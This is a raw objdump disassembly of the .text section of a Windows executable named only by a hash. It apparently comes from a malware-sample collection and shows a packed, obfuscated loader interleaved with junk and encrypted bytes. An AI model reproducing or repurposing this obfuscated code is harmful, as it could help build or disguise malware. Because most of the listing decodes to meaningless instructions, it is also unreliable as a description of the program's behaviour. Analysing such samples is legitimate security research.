
aa7c43c2c28e3dc42f1851017415b1005921302c9af215269b2921e3517458dc.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x2c
  401006:	mov    ecx,DWORD PTR ds:0x4292e5
  40100c:	mov    eax,ds:0x4292f5
  401011:	sub    eax,ecx
  401013:	xor    ecx,DWORD PTR [ecx+eax*1]
  401016:	mov    DWORD PTR [ebp-0x8],0xf89c8534
  40101d:	not    ecx
  40101f:	jmp    0x4010ec
  401024:	cdq    
  401025:	data16 cmc 
  401027:	push   edx
  401028:	push   ebp
  401029:	jge    0x4010a4
  40102b:	jge    0x401034
  40102d:	jmp    FWORD PTR [ebx+0xf412b85]
  401033:	mov    bh,BYTE PTR [esp+edi*2+0x7c]
  401037:	jl     0x400fe5
  401039:	jl     0x4010b7
  40103b:	jl     0x401009
  40103d:	(bad)  
  40103e:	xor    ecx,ebx
  401040:	xor    eax,0xccddcfdb
  401045:	ja     0x4010bd
  401047:	or     ecx,DWORD PTR [edi]
  401049:	or     BYTE PTR [edx],0xf
  40104c:	cmp    ecx,DWORD PTR [edi]
  40104e:	retf   0x3712
  401051:	sbb    bl,BYTE PTR [edi]
  401053:	mov    ch,0x52
  401055:	or     ah,BYTE PTR [edi-0x4e10f32f]
  40105b:	rol    esp,cl
  40105d:	or     ecx,DWORD PTR [esp+edx*1+0x4da8e6bc]
  401064:	sbb    DWORD PTR [ecx+0x541fb4dc],esp
  40106a:	out    dx,al
  40106b:	outs   dx,DWORD PTR ds:[esi]
  40106c:	add    ebx,DWORD PTR ds:0x4ac4729e
  401072:	mov    al,ds:0x36dd215b
  401077:	mov    eax,ds:0xa3c97380
  40107d:	je     0x4010b5
  40107f:	fisttp DWORD PTR [ebp+0x359ac4f5]
  401085:	jecxz  0x4010c1
  401087:	and    ebp,0x4f
  40108a:	aam    0x94
  40108c:	dec    ebp
  40108d:	inc    DWORD PTR [edi-0x2f5a886e]
  401093:	mov    cl,0x41
  401095:	loope  0x4010bb
  401097:	pop    ecx
  401098:	sub    edi,DWORD PTR [eax-0x41639320]
  40109e:	jae    0x4010bd
  4010a0:	retf   
  4010a1:	cwde   
  4010a2:	sub    eax,0xc85ce3c6
  4010a7:	(bad)  
  4010a8:	mov    dl,0xfa
  4010aa:	loopne 0x401044
  4010ac:	cmp    eax,0xc76966cf
  4010b1:	sub    al,cl
  4010b3:	or     ch,dl
  4010b5:	sbb    eax,0xb39945d
  4010ba:	outs   dx,DWORD PTR ds:[esi]
  4010bb:	ins    DWORD PTR es:[edi],dx
  4010bc:	jb     0x4010c0
  4010be:	cmp    eax,0x22468cd1
  4010c3:	jns    0x401144
  4010c5:	cmp    al,0x8f
  4010c7:	add    bl,dl
  4010c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4010ca:	add    edx,DWORD PTR [ebx+0x59]
  4010cd:	rol    esp,1
  4010cf:	add    eax,0x15d55edb
  4010d4:	jge    0x401072
  4010d6:	mov    ah,0x43
  4010d8:	daa    
  4010d9:	sbb    DWORD PTR [ebx],esp
  4010db:	addr16 and eax,0x4f3cdb10
  4010e1:	loop   0x4010a4
  4010e3:	xchg   esi,eax
  4010e4:	cmp    al,0x9c
  4010e7:	dec    esp
  4010e8:	adc    al,0xba
  4010ea:	xor    esi,DWORD PTR [esi+0x35ec45c7]
  4010f0:	test   DWORD PTR [eax+edi*8+0x9507b8],ebx
  4010f7:	add    BYTE PTR [ecx],al
  4010f9:	or     eax,0x427cf7
  4010fe:	jmp    0x4011cb
  401103:	leave  
  401104:	mov    bh,BYTE PTR [edi+esi*4-0x7536b24d]
  40110b:	pop    ebx
  40110c:	mov    dl,0x88
  40110e:	(bad)  
  40110f:	in     al,0x8b
  401111:	stc    
  401112:	add    ebp,DWORD PTR [esp+edi*2+0x7cac7c7c]
  401119:	jl     0x401197
  40111b:	stos   DWORD PTR es:[edi],eax
  40111c:	cmp    bh,BYTE PTR [esi]
  40111e:	ja     0x4010cd
  401120:	std    
  401121:	dec    edi
  401122:	adc    eax,0x31d9f8e3
  401127:	(bad)  
  401128:	inc    ebp
  401129:	mov    ebx,DWORD PTR [eax]
  40112b:	cmp    edx,DWORD PTR [edi+0x14]
  40112e:	cmp    eax,0x9d7e7661
  401133:	pop    es
  401134:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401135:	pop    ecx
  401136:	jae    0x401174
  401138:	pusha  
  401139:	adc    BYTE PTR [eax],bh
  40113b:	mov    ebp,DWORD PTR [ebp-0x50]
  40113e:	push   eax
  40113f:	(bad)  
  401140:	repnz and eax,eax
  401143:	int3   
  401144:	add    esp,DWORD PTR [ebx-0x2eac4797]
  40114a:	sahf   
  40114b:	not    DWORD PTR [edx-0x43ef5adf]
  401151:	mov    WORD PTR ds:0x41476222,fs
  401157:	inc    eax
  401158:	out    0x83,eax
  40115a:	clc    
  40115b:	or     DWORD PTR [eax],0xffffffa1
  40115e:	inc    eax
  40115f:	push   ss
  401160:	and    eax,0x6c3c7ab9
  401165:	pop    es
  401166:	es sbb eax,0xc83f7bb7
  40116c:	xlat   BYTE PTR ds:[ebx]
  40116d:	jecxz  0x401185
  40116f:	mov    bl,dh
  401171:	call   0x11d84f4d
  401176:	mov    BYTE PTR [ecx-0x76],bh
  401179:	push   esi
  40117a:	push   0xffffffbb
  40117c:	mov    fs,WORD PTR [ecx]
  40117e:	out    dx,eax
  40117f:	inc    edx
  401180:	mov    ebx,0xe8344d21
  401185:	xlat   BYTE PTR ds:[ebx]
  401186:	jne    0x40113b
  401188:	pop    eax
  401189:	loope  0x401149
  40118b:	retf   
  40118c:	bound  eax,QWORD PTR [ebx-0x60dd25f0]
  401192:	mov    ah,0xc9
  401194:	mov    DWORD PTR [ebx-0x7b890f07],esp
  40119a:	je     0x401187
  40119c:	icebp  
  40119d:	mov    ecx,0xb4c08af9
  4011a2:	fwait
  4011a3:	xchg   ebp,eax
  4011a4:	dec    esi
  4011a5:	push   ebx
  4011a6:	cmp    DWORD PTR [ebx+0x4076881],0xffffffdd
  4011ad:	mov    dh,0x68
  4011af:	xor    DWORD PTR fs:[esi+0x37],eax
  4011b3:	aaa    
  4011b4:	call   FWORD PTR [ebx+0x50]
  4011b7:	retf   0x4963
  4011ba:	scas   eax,DWORD PTR es:[edi]
  4011bb:	sar    BYTE PTR [edx+edx*8],cl
  4011be:	push   ecx
  4011bf:	lock xor eax,0x55ed72e2
  4011c5:	push   es
  4011c6:	inc    ecx
  4011c7:	es xor ah,dh
  4011ca:	out    dx,eax
  4011cb:	mov    WORD PTR [ebp-0x4],ax
  4011cf:	lea    eax,[ebp-0x24]
  4011d2:	xor    DWORD PTR ds:0x4275a0,0x226
  4011dc:	mov    DWORD PTR [ebp-0x28],eax
  4011df:	not    DWORD PTR ds:0x4292b5
  4011e5:	mov    eax,DWORD PTR [ebp+0x8]
  4011e8:	movzx  ecx,BYTE PTR ds:0x4275a4
  4011ef:	adc    ecx,DWORD PTR ds:0x4292cd
  4011f5:	mov    DWORD PTR ds:0x4275a4,ecx
  4011fb:	mov    DWORD PTR [ebp-0x20],eax
  4011fe:	xor    DWORD PTR ds:0x42c89e,0x5a6f
  401208:	push   ebx
  401209:	sub    DWORD PTR ds:0x4275a0,ebx
  40120f:	lea    eax,[ebp-0x18]
  401212:	mov    DWORD PTR ds:0x4275ac,0x15
  40121c:	cmp    DWORD PTR ds:0x4275ac,0x0
  401223:	je     0x40124e
  401229:	cmp    DWORD PTR ds:0x4275ac,0x1b
  401230:	jne    0x40123c
  401236:	call   DWORD PTR ds:0x4279b7
  40123c:	mov    ebx,DWORD PTR ds:0x4275ac
  401242:	dec    ebx
  401243:	mov    DWORD PTR ds:0x4275ac,ebx
  401249:	jmp    0x40121c
  40124e:	mov    DWORD PTR [ebp-0x1c],eax
  401251:	movzx  ebx,WORD PTR ds:0x4292c5
  401258:	and    DWORD PTR ds:0x42c896,ebx
  40125e:	mov    eax,DWORD PTR [ebp-0x1c]
  401261:	mov    DWORD PTR ds:0x4292ad,0xc0c
  40126b:	push   esi
  40126c:	push   edi
  40126d:	or     edi,ecx
  40126f:	mov    edi,0xf89f2dad
  401274:	add    ebx,0x5343
  40127a:	mov    DWORD PTR [eax],edi
  40127c:	sub    ecx,DWORD PTR ds:0x427d1f
  401282:	mov    eax,DWORD PTR [ebp-0x14]
  401285:	add    DWORD PTR ds:0x4275a4,0x42c886
  40128f:	mov    ebx,DWORD PTR [ebp-0x8]
  401292:	mov    ecx,0x7510857
  401297:	sbb    DWORD PTR ds:0x427d03,ecx
  40129d:	xor    eax,ecx
  40129f:	mov    esi,0x32729e
  4012a4:	sub    DWORD PTR ds:0x4292b9,0x427cf7
  4012ae:	xor    ebx,ecx
  4012b0:	xor    edx,edx
  4012b2:	add    eax,esi
  4012b4:	adc    DWORD PTR ds:0x4292d5,0x427d07
  4012be:	jmp    0x40138b
  4012c3:	ror    BYTE PTR [edx],0x15
  4012c6:	std    
  4012c7:	std    
  4012c8:	std    
  4012c9:	fsubr  DWORD PTR ds:0xe0012c42
  4012cf:	retf   
  4012d0:	inc    esp
  4012d1:	mov    ds:0x7c7fdcf0,eax
  4012d6:	jl     0x401284
  4012d8:	jl     0x401356
  4012da:	jl     0x4012e1
  4012dc:	adc    esi,DWORD PTR [edi]
  4012de:	sub    dl,BYTE PTR [edx]
  4012e0:	cmp    al,0xf
  4012e2:	into   
  4012e3:	sub    dl,BYTE PTR [ecx+0x4d04b3d9]
  4012e9:	push   edi
  4012ea:	xchg   esi,eax
  4012eb:	out    0x85,al
  4012ed:	loopne 0x401288
  4012ef:	adc    DWORD PTR [esi+0x48c25a0b],eax
  4012f5:	das    
  4012f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4012f7:	dec    eax
  4012f8:	loopne 0x40134d
  4012fa:	lods   al,BYTE PTR cs:[esi]
  4012fc:	jmp    0xaaaf:0xc09e792d
  401303:	jmp    FWORD PTR [edx+0x6fff4bea]
  401309:	iret   
  40130a:	ss fwait
  40130c:	jecxz  0x40135c
  40130e:	xor    dl,bh
  401310:	pop    esp
  401311:	mov    al,BYTE PTR [eax+eax*1+0x7a]
  401315:	or     al,0x8d
  401317:	xor    DWORD PTR fs:[eax],ebx
  40131a:	mov    dh,0xd3
  40131c:	or     DWORD PTR [esi],edi
  40131e:	xchg   ebp,eax
  40131f:	mov    ds:0xff27e50e,eax
  401325:	cld    
  401326:	sub    DWORD PTR [esi],ebp
  401328:	jne    0x4012ce
  40132a:	popa   
  40132b:	mov    ds:0x4cf08009,eax
  401330:	cmc    
  401331:	and    al,0x1a
  401333:	mov    esi,0xe1a3a0ba
  401338:	adc    BYTE PTR [eax],0x8d
  40133b:	inc    esp
  40133c:	icebp  
  40133d:	aas    
  40133e:	fst    DWORD PTR [edi+ecx*8]
  401341:	and    ah,bh
  401343:	daa    
  401344:	cmc    
  401345:	pusha  
  401346:	icebp  
  401347:	dec    edi
  401348:	sbb    edx,edx
  40134a:	xor    ecx,DWORD PTR [ebp-0x3d2f8be0]
  401350:	jno    0x4012e9
  401352:	sbb    al,0x3
  401354:	stos   BYTE PTR es:[edi],al
  401355:	or     cl,al
  401357:	xchg   esp,eax
  401358:	jp     0x401396
  40135a:	push   esp
  40135b:	jp     0x40138c
  40135d:	loop   0x401350
  40135f:	popf   
  401360:	and    eax,0x39708e28
  401365:	ss popf 
  401367:	pushf  
  401368:	pop    eax
  401369:	cmp    eax,0x96c4be64
  40136e:	(bad)  
  401370:	mov    al,BYTE PTR [edx-0x4d607baf]
  401376:	mov    ebp,0x7e974e1e
  40137b:	add    bh,al
  40137d:	sbb    eax,DWORD PTR [edi+eiz*8-0x69]
  401381:	xor    DWORD PTR [edi],ebp
  401383:	jmp    0x40138e
  401385:	ins    BYTE PTR es:[edi],dx
  401386:	xor    DWORD PTR [ecx],ecx
  401388:	retf   
  401389:	mov    ch,0xd4
  40138b:	add    ebx,esi
  40138d:	div    ebx
  40138f:	mov    edx,0x67cd
  401394:	mov    edx,DWORD PTR [ebp-0x20]
  401397:	mov    DWORD PTR [ebp-0x2c],0x4eb5
  40139e:	jmp    0x40146b
  4013a3:	(bad)  
  4013a4:	mov    bl,ch
  4013a6:	nop
  4013a7:	jge    0x40140c
  4013a9:	jns    0x4013f5
  4013ab:	imul   edi,DWORD PTR [ecx+0xdbe3a1b],0x7e0c44c5
  4013b5:	jl     0x401433
  4013b7:	lods   al,BYTE PTR ds:[esi]
  4013b8:	jl     0x401436
  4013ba:	jl     0x4013de
  4013bc:	je     0x4013c4
  4013be:	mov    esi,0xd8415edd
  4013c3:	push   es
  4013c4:	out    dx,al
  4013c5:	mov    dl,0x3b
  4013c7:	pusha  
  4013c8:	frstor [edx]
  4013ca:	push   cs
  4013cb:	mov    ch,0xba
  4013cd:	stos   BYTE PTR es:[edi],al
  4013ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4013cf:	xor    ch,bl
  4013d1:	jae    0x4013ae
  4013d3:	push   edi
  4013d4:	(bad)  
  4013d5:	xor    BYTE PTR [edi],bl
  4013d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4013d8:	(bad)  
  4013d9:	add    BYTE PTR [ecx],ch
  4013db:	lods   eax,DWORD PTR ds:[esi]
  4013dc:	fld    TBYTE PTR [edi-0x2f18d9c8]
  4013e2:	jl     0x401437
  4013e4:	cld    
  4013e5:	aam    0x47
  4013e7:	cmp    bh,bh
  4013e9:	xchg   edx,eax
  4013ea:	mov    dh,BYTE PTR [ecx+0xba75388]
  4013f0:	or     al,0x2f
  4013f2:	or     dh,0x1c
  4013f5:	mov    eax,0x10c2606d
  4013fa:	enter  0x59e6,0xda
  4013fe:	in     eax,0x6a
  401400:	loope  0x401391
  401402:	jnp    0x401390
  401404:	or     al,0x4b
  401406:	and    al,0x8
  401408:	push   es
  401409:	nop
  40140a:	mov    cl,BYTE PTR [ecx-0x6d1c2834]
  401410:	dec    edx
  401411:	data16 mov cl,0x28
  401414:	dec    esi
  401415:	add    ah,BYTE PTR [esi]
  401417:	xchg   ebx,eax
  401418:	adc    al,BYTE PTR [eax+eiz*1]
  40141b:	push   eax
  40141c:	fistp  QWORD PTR [eax+0x7e]
  40141f:	(bad)  
  401420:	sti    
  401421:	mov    ds:0x5a71db19,al
  401426:	iret   
  401427:	fnstcw WORD PTR [ecx-0x56]
  40142a:	shr    DWORD PTR [eax-0x26],0x85
  40142e:	test   al,0x7b
  401430:	pop    ebx
  401431:	dec    edi
  401432:	aam    0x5e
  401434:	adc    ebp,DWORD PTR [edi]
  401436:	test   DWORD PTR es:[edx-0x25e7c4bf],ebp
  40143d:	stos   BYTE PTR es:[edi],al
  40143e:	popf   
  40143f:	mov    eax,0xcef05245
  401444:	aaa    
  401445:	push   ebx
  401446:	xor    BYTE PTR [ecx+0x7e041ea],0x23
  40144d:	(bad)  [edx+ebx*4]
  401450:	das    
  401451:	div    BYTE PTR [ecx-0x62]
  401454:	leave  
  401455:	(bad)  
  401456:	mov    WORD PTR [ecx-0x3d7145af],?
  40145c:	mov    cl,0x85
  40145e:	or     DWORD PTR [ebp-0x5d2633ac],edi
  401464:	or     al,0x42
  401466:	(bad)  
  401467:	jb     0x401423
  401469:	sahf   
  40146a:	mov    edi,0x5c7023b
  40146f:	xchg   esp,eax
  401470:	jne    0x4014b4
  401472:	add    BYTE PTR [eax+0x11],dh
  401475:	add    BYTE PTR [eax],al
  401477:	je     0x40195a
  40147d:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  401484:	sub    DWORD PTR ds:0x42759c,edx
  40148a:	lea    eax,[ebp-0xc]
  40148d:	mov    DWORD PTR [ebp-0x10],eax
  401490:	sub    edx,eax
  401492:	mov    eax,DWORD PTR [ebp-0x10]
  401495:	not    edx
  401497:	mov    edx,DWORD PTR [eax]
  401499:	imul   edx,edx,0xf89ea9e0
  40149f:	mov    DWORD PTR ds:0x42c88a,0x7964
  4014a9:	mov    DWORD PTR [eax],edx
  4014ab:	mov    DWORD PTR ds:0x4292d9,0x7646
  4014b5:	mov    eax,DWORD PTR [ebp-0xc]
  4014b8:	cmp    eax,0x1fe34420
  4014bd:	mov    DWORD PTR ds:0x4292d5,0x4bbf
  4014c7:	je     0x401629
  4014cd:	and    ebx,0x6650
  4014d3:	jmp    0x4015a0
  4014d8:	cs scas eax,DWORD PTR es:[edi]
  4014da:	inc    ebp
  4014db:	add    eax,0xa36ee545
  4014e0:	sbb    DWORD PTR [edi+0x6301e5e0],ebx
  4014e6:	cmp    DWORD PTR [eax],eax
  4014e8:	mov    esp,0xac7c7c7e
  4014ed:	jl     0x40156b
  4014ef:	jl     0x40149f
  4014f1:	stos   BYTE PTR es:[edi],al
  4014f2:	jae    0x401566
  4014f4:	mov    edi,0x65f70e6e
  4014f9:	push   eax
  4014fa:	mov    ds:0x2a430ff2,al
  4014ff:	out    0xab,eax
  401501:	(bad)  
  401502:	pushf  
  401503:	call   0xec231923
  401508:	and    al,cl
  40150a:	clc    
  40150b:	int3   
  40150c:	adc    eax,0xc6824261
  401511:	cmc    
  401512:	jl     0x4014e1
  401514:	popf   
  401515:	ja     0x401578
  401517:	mov    eax,0xb6a10b3c
  40151c:	jmp    0xcaddb4b0
  401521:	sahf   
  401522:	xor    al,0xaf
  401524:	int    0x8b
  401526:	jg     0x4014d6
  401528:	and    DWORD PTR [ecx+0x10],ebx
  40152b:	push   eax
  40152c:	lods   eax,DWORD PTR ds:[esi]
  40152d:	jnp    0x4014f4
  40152f:	sub    BYTE PTR [esi-0x39],0x7
  401533:	mov    bh,0x5c
  401535:	push   ds
  401536:	(bad)  [ebx+ebp*2-0x14]
  40153a:	push   eax
  40153b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40153c:	shr    esp,1
  40153e:	imul   ah
  401540:	xchg   DWORD PTR [ebx],eax
  401542:	imul   ebp,DWORD PTR [edx+0x47],0xffffffd9
  401546:	aam    0xa
  401548:	xor    al,0x73
  40154a:	mov    ebp,0xb46c1fe
  40154f:	lds    esp,FWORD PTR [edx-0x47]
  401552:	add    ch,bh
  401554:	js     0x401520
  401556:	xchg   ebx,eax
  401557:	test   DWORD PTR [ebx+0x70],ecx
  40155a:	adc    BYTE PTR [ecx+0x784c6be8],ah
  401560:	scas   eax,DWORD PTR es:[edi]
  401561:	fsub   DWORD PTR [ecx+0x2a]
  401564:	stc    
  401565:	mov    ch,0x50
  401567:	sbb    BYTE PTR [esp+eax*8],dh
  40156a:	mov    al,ds:0x23b992c6
  40156f:	into   
  401570:	ja     0x401502
  401572:	sahf   
  401573:	pop    ecx
  401574:	inc    edx
  401575:	call   0x3ca734df
  40157a:	add    esp,ecx
  40157c:	addr16 je 0x4015fc
  40157f:	sub    DWORD PTR [ebx-0x5e13e704],ebp
  401585:	add    BYTE PTR [ecx+0x35],al
  401588:	retf   0x4845
  40158b:	daa    
  40158c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40158d:	cmp    bl,BYTE PTR [esi-0x18c4a4e4]
  401593:	mov    dl,0xe1
  401595:	fwait
  401596:	push   ebx
  401597:	dec    edx
  401598:	lock add eax,0xfab9e6b7
  40159e:	and    BYTE PTR fs:[ebx+0x881e445],cl
  4015a5:	nop
  4015a6:	sbb    al,0x75
  4015a8:	pusha  
  4015a9:	mov    DWORD PTR ds:0x427598,0x14
  4015b3:	cmp    DWORD PTR ds:0x427598,0x0
  4015ba:	je     0x40160a
  4015c0:	cmp    DWORD PTR ds:0x427598,0x6
  4015c7:	jne    0x4015d9
  4015cd:	push   DWORD PTR [ebp-0x1c]
  4015d0:	push   DWORD PTR [ebp-0xc]
  4015d3:	call   DWORD PTR ds:0x427c3f
  4015d9:	cmp    DWORD PTR ds:0x427598,0x7
  4015e0:	jne    0x4015f4
  4015e6:	xor    eax,eax
  4015e8:	xor    eax,DWORD PTR ds:0x427598
  4015ee:	dec    eax
  4015ef:	mov    ds:0x427598,eax
  4015f4:	mov    eax,ds:0x427598
  4015f9:	dec    eax
  4015fa:	mov    ds:0x427598,eax
  4015ff:	jmp    0x4015b3
  401604:	or     DWORD PTR ds:0x427594,edi
  40160a:	mov    eax,DWORD PTR [ebp-0x8]
  40160d:	mov    ebx,DWORD PTR ds:0x427d8c
  401613:	mov    edi,DWORD PTR ds:0x42c8de
  401619:	sub    edi,ebx
  40161b:	sub    ebx,DWORD PTR [ebx+edi*1]
  40161e:	xor    eax,ecx
  401620:	add    eax,esi
  401622:	pop    edi
  401623:	pop    esi
  401624:	pop    ebx
  401625:	leave  
  401626:	ret    0x4
  401629:	mov    eax,DWORD PTR [ebp-0xc]
  40162c:	add    eax,DWORD PTR [ebp-0x18]
  40162f:	cmp    eax,0x188271cd
  401634:	je     0x401648
  40163a:	mov    eax,DWORD PTR [ebp-0x10]
  40163d:	and    DWORD PTR [eax],0x751c9d
  401643:	jmp    0x4015a9
  401648:	mov    eax,DWORD PTR [ebp-0xc]
  40164b:	mov    edx,DWORD PTR [ebp-0x18]
  40164e:	or     eax,edx
  401650:	cmp    eax,0xffff6dad
  401655:	je     0x401669
  40165b:	mov    eax,DWORD PTR [ebp-0x10]
  40165e:	xor    DWORD PTR [eax],0x2650fa8f
  401664:	jmp    0x4015a9
  401669:	mov    ax,WORD PTR [ebp-0x4]
  40166d:	mov    edi,DWORD PTR [ebp+0x8]
  401670:	mov    edi,DWORD PTR [edi]
  401672:	mov    edx,0x8a42
  401677:	xor    ax,dx
  40167a:	mov    edx,0x3b08
  40167f:	add    ax,dx
  401682:	cmp    ax,WORD PTR [edi]
  401685:	je     0x401939
  40168b:	mov    eax,DWORD PTR [ebp-0x14]
  40168e:	xor    eax,ecx
  401690:	add    eax,esi
  401692:	mov    DWORD PTR [ebp-0x24],eax
  401695:	mov    eax,DWORD PTR [ebp-0x28]
  401698:	mov    di,WORD PTR [ebp-0x2c]
  40169c:	mov    ebx,0x8a42
  4016a1:	xor    di,bx
  4016a4:	jmp    0x401771
  4016a9:	pop    ebp
  4016aa:	and    ebx,DWORD PTR [ebp-0x65]
  4016ad:	jge    0x40172c
  4016af:	pop    ebp
  4016b0:	in     eax,0x36
  4016b2:	call   0x877a:0x40d328ca
  4016b9:	in     al,dx
  4016ba:	jno    0x401738
  4016bc:	jl     0x40166a
  4016be:	jl     0x40173c
  4016c0:	jl     0x401660
  4016c2:	mov    ss,WORD PTR [esi+0x3]
  4016c5:	test   al,0x17
  4016c7:	mov    DWORD PTR cs:[edi],edx
  4016ca:	in     al,0x4b
  4016cc:	mov    ecx,edx
  4016ce:	xchg   edi,eax
  4016cf:	add    esp,DWORD PTR [ecx-0x26b7881b]
  4016d5:	bound  eax,QWORD PTR [ecx-0x5f]
  4016d8:	addr16 cs int3 
  4016db:	cmp    DWORD PTR ds:0xa01f9075,ebx
  4016e1:	fistp  DWORD PTR [edx]
  4016e3:	or     eax,0x24c4507b
  4016e8:	and    ecx,DWORD PTR [edx]
  4016ea:	jnp    0x401720
  4016ec:	es xchg esp,eax
  4016ee:	jmp    0x4016b1
  4016f0:	aas    
  4016f1:	int    0xe8
  4016f3:	adc    al,BYTE PTR [edx-0x7fd1e71]
  4016f9:	mov    ch,cl
  4016fb:	mov    edi,0x5f821a17
  401700:	sbb    eax,0x9914b8e2
  401705:	(bad)  
  401706:	jo     0x401775
  401708:	pop    ecx
  401709:	mov    dl,0x70
  40170b:	jl     0x401704
  40170d:	lods   al,BYTE PTR ds:[esi]
  40170e:	mul    ch
  401710:	repz shl esi,0x74
  401714:	fdecstp 
  401716:	mov    dl,0x39
  401718:	out    dx,eax
  401719:	je     0x4016b7
  40171b:	adc    esi,DWORD PTR [ebx+0x29]
  40171e:	cld    
  40171f:	inc    edi
  401720:	pusha  
  401721:	and    ah,bh
  401723:	das    
  401724:	jmp    0x4017a0
  401726:	rol    BYTE PTR [ecx+0x68],cl
  401729:	scas   eax,DWORD PTR es:[edi]
  40172a:	sub    DWORD PTR [ecx-0x7a],0x75
  40172e:	sar    DWORD PTR [esi+0x13],0x2c
  401732:	popa   
  401733:	push   esi
  401734:	push   edi
  401735:	pop    es
  401736:	popa   
  401737:	adc    al,0xb1
  401739:	ficomp DWORD PTR [edi-0x70]
  40173c:	fadd   st(7),st
  40173e:	repz jnp 0x4017aa
  401741:	push   0xffffff87
  401743:	xchg   BYTE PTR [esi-0x6c],al
  401746:	inc    ebx
  401747:	mov    BYTE PTR [esi-0x401a77fb],ah
  40174d:	ret    0xfd2f
  401750:	(bad)  
  401751:	mov    esp,0xc2a57a50
  401756:	test   al,0x41
  401758:	xchg   BYTE PTR [ebx],bh
  40175a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40175b:	mov    ds:0xd5997c13,al
  401760:	(bad)  [esi-0x33]
  401763:	sbb    ecx,DWORD PTR [esi-0x2a]
  401766:	mov    bh,0x86
  401768:	lea    edi,[ecx-0x43b1d7a]
  40176e:	xor    al,0x5d
  401770:	ins    DWORD PTR es:[edi],dx
  401771:	add    di,dx
  401774:	movzx  edx,di
  401777:	mov    edi,DWORD PTR [ebp-0x8]
  40177a:	jmp    0x401847
  40177f:	repz shl DWORD PTR [edx+0x55456240],cl
  401786:	jecxz  0x401791
  401788:	push   cs
  401789:	scas   eax,DWORD PTR es:[edi]
  40178a:	ror    BYTE PTR [edx+0x1cc9b4aa],1
  401790:	jo     0x40180e
  401792:	jl     0x401740
  401794:	jl     0x401812
  401796:	jl     0x40180c
  401798:	lea    ebp,[eax+0x46dd5738]
  40179e:	nop
  40179f:	mov    esp,DWORD PTR [edi-0x3a]
  4017a2:	mov    bh,0x4
  4017a4:	mov    esp,edi
  4017a6:	fs and edi,eax
  4017a9:	xchg   esi,eax
  4017aa:	jno    0x401824
  4017ac:	mov    ebp,edx
  4017ae:	mov    ch,0xa7
  4017b0:	lods   al,BYTE PTR ds:[esi]
  4017b1:	outs   dx,BYTE PTR ds:[esi]
  4017b2:	cmc    
  4017b3:	sahf   
  4017b4:	loope  0x40175e
  4017b6:	pop    ecx
  4017b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4017b8:	and    al,0x3
  4017ba:	adc    BYTE PTR [eax],dh
  4017bc:	(bad)  
  4017bd:	shr    BYTE PTR [eax],0x70
  4017c0:	pop    ss
  4017c1:	sub    al,0x27
  4017c3:	and    ebx,DWORD PTR [ebp+0x4c]
  4017c6:	sub    BYTE PTR [ebp+0xae0bf06],ah
  4017cc:	std    
  4017cd:	mov    WORD PTR [edx-0xd],?
  4017d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4017d1:	and    al,0xbe
  4017d3:	or     esi,0xffffffb1
  4017d6:	dec    eax
  4017d7:	fs add esi,esp
  4017da:	test   eax,0x78c6bc96
  4017df:	dec    ebx
  4017e0:	out    0x75,eax
  4017e2:	hlt    
  4017e3:	pop    edx
  4017e4:	ret    
  4017e5:	les    ebp,FWORD PTR [esi-0x3ac1e0f4]
  4017eb:	xchg   edx,eax
  4017ec:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  4017ee:	mov    BYTE PTR [ecx+ecx*1],cl
  4017f1:	aad    0x61
  4017f3:	int    0x29
  4017f5:	in     al,dx
  4017f6:	mov    eax,0xfd3c36a4
  4017fb:	jmp    0x2243c268
  401800:	xchg   edi,eax
  401801:	int    0x76
  401803:	test   cl,dh
  401805:	dec    ecx
  401806:	jno    0x401839
  401808:	push   edx
  401809:	push   esi
  40180a:	mov    al,ds:0xb63cb067
  40180f:	mov    cl,0x18
  401811:	imul   esp,DWORD PTR [edx+0x3d9451dd],0x5c
  401818:	or     BYTE PTR [esp+esi*2],dh
  40181b:	stc    
  40181c:	and    eax,0x86d36b76
  401821:	push   ebp
  401822:	pop    edx
  401823:	hlt    
  401824:	add    DWORD PTR [ecx],esi
  401826:	cmp    eax,0x9b1c22dc
  40182b:	adc    eax,0x4a422cf1
  401830:	or     bl,dh
  401832:	not    BYTE PTR [edx-0x1d]
  401835:	loope  0x401805
  401837:	mov    bl,0xd3
  401839:	sbb    esi,esi
  40183b:	xor    ah,ah
  40183d:	ss jle 0x4018b8
  401840:	fist   WORD PTR [edx]
  401842:	mov    bl,0x70
  401844:	stos   BYTE PTR es:[edi],al
  401845:	jmp    0x3a94:0x8df933dc
  40184c:	sahf   
  40184d:	jb     0x401881
  40184f:	add    BYTE PTR [ecx],al
  401851:	adc    BYTE PTR [ebx+0x558be045],cl
  401857:	clc    
  401858:	mov    edi,DWORD PTR [ebp-0x24]
  40185b:	xor    edx,ecx
  40185d:	add    edx,esi
  40185f:	imul   edx,edi
  401862:	sub    DWORD PTR [eax],edx
  401864:	jmp    0x401931
  401869:	pop    ebx
  40186a:	jno    0x401829
  40186c:	loope  0x4018eb
  40186e:	jge    0x4018cb
  401870:	lods   eax,DWORD PTR ds:[esi]
  401871:	xlat   BYTE PTR ds:[ebx]
  401872:	mov    bh,0x47
  401874:	jns    0x401831
  401876:	inc    edx
  401877:	add    ecx,DWORD PTR es:[eax+esi*2+0x7c]
  40187c:	jl     0x40182a
  40187e:	jl     0x4018fc
  401880:	jl     0x4018ad
  401882:	in     al,0x25
  401884:	xchg   esp,eax
  401885:	xlat   BYTE PTR ds:[ebx]
  401886:	pop    ss
  401887:	jno    0x4018c7
  401889:	dec    ecx
  40188a:	arpl   WORD PTR [edi],cx
  40188c:	out    0x82,eax
  40188e:	lods   al,BYTE PTR ds:[esi]
  40188f:	pop    edi
  401891:	and    al,0x30
  401893:	sbb    al,0xa1
  401895:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401896:	xchg   edx,eax
  401897:	dec    edx
